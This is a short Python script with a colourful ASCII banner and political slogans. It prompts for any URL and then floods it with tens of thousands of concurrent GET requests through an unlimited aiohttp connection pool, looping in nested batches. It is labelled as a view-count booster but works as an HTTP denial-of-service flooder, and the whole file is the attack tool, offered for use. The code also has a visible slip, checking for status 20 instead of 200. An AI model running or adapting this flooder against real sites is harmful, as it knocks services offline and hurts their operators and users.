#!/usr/bin/python3
# -*- coding: utf-8 -*-
import os
import sys
import asyncio
import aiohttp
import fade
import os
import requests 
# Clear command prompt based on the operating system
if os.name == "nt":  # Windows
    os.system("cls")
else:  # Unix/Linux/Mac
     os.system("clear")


logo = """
══════════════════════════════════════════════════════════════════════════════

==========  ===         ===  =========    ==========   ==========
==========   ===       ===   === == ===   ==========   === === ===
===           ===     ===    ===     ===  ===          ===     ===
===            =========     === == ==    ==========   === === ==
===              =====       ===     ===  ===          === === ===
==========        ===        === == ===   ===========  ===      ===
==========        ===        =========    ===========  ===       ===
  ===        === ==========   =====     ===== ===       ===
   ===      ===  === ==  ===  === ==   == ===  ===     ===
    ==========   ===      === ===  == ==  ===   ===   ===
     ========    === ==  ===  ===   ===   ===    =======
      ==  ==     === ==  ===  ===   ===   ===     =====
       =  =      ===    ===   ===         ===      ===
        ==       ===     ===  ===         ===      ===

\033[92m      =======       ===        ========   ==  ========      \033[0m
\033[92m      ==    ==     == ==             ==   ==        ==      \033[0m
\033[33m      == ==       ==    ==     ========   ==  ========      \033[0m
\033[33m      ==    ==   ==  ==  ==          ==   ==        ==      \033[0m
\033[33m      =======   ==         ==  ========   ==  ========      \033[0m

═══════════════════════════════════════════════════════════════════════════
"""
faded_text = fade.fire(logo)
print(faded_text)
ask = fade.pinkred("\033[33m==⟩⟩INPUT URL: \033[0m")
url = input(ask)
print("\033[31m________________________\033[0m")
print("\033[96mBIRRUH BIDDAM NAFDHIKA YA AQSA 🇵🇸 LONG LIVE THE STRUGGLE 🇵🇸\033[0m")

async def increment_view_count(session):
    try:
        async with session.get(url) as response:
            if response.status == 20:
                print("\033[32m[÷]\033[31mHASBUNALLAH WANIKMAL WAKIL ▒▒\033[33m▒▒\033[92mNIKMAL MAULA WANIKMAN NASIR\033[33m▒▒\033[34mREQUEST\033[33m▒▒\033[31mSENT\033[37m▒▒\033[37m" +str(url)+ "\033[31m▒▒::")
            else:
                print("\033[37m[÷]\033[33mHASBUNALLAH WANIKMAL WAKIL ▒▒\033[92m▒▒\033[97mNIKMAL MAULA WANIKMAN NASIR\033[34m▒▒\033[4mREQUEST\033[31m▒▒\033[33mSENT\033[37m▒▒\033[36m" +str(url)+ "\033[31m▒▒::")
            
    except aiohttp.ClientError as e:
           print("\033[33m[÷]\033[31m▒▒\033[94m▒▒HASBUNALLAH WANIKMAL WAKIL\033[96m▒▒URL\033[31m▒▒TIME\033[37m▒▒\033[35m\033[31m▒▒OUT\033[37m▒▒::")
            

async def main():
    connector = aiohttp.TCPConnector(limit=None)  # Enable connection pooling
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for _ in range(19999):  # Increase the number of concurrent requests
            task = asyncio.create_task(increment_view_count(session))
            tasks.append(task)
            for i in range(19999):  # Increase the number of concurrent requests
                task = asyncio.create_task(increment_view_count(session))
                tasks.append(task)
            await asyncio.gather(*tasks)
        await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(main())
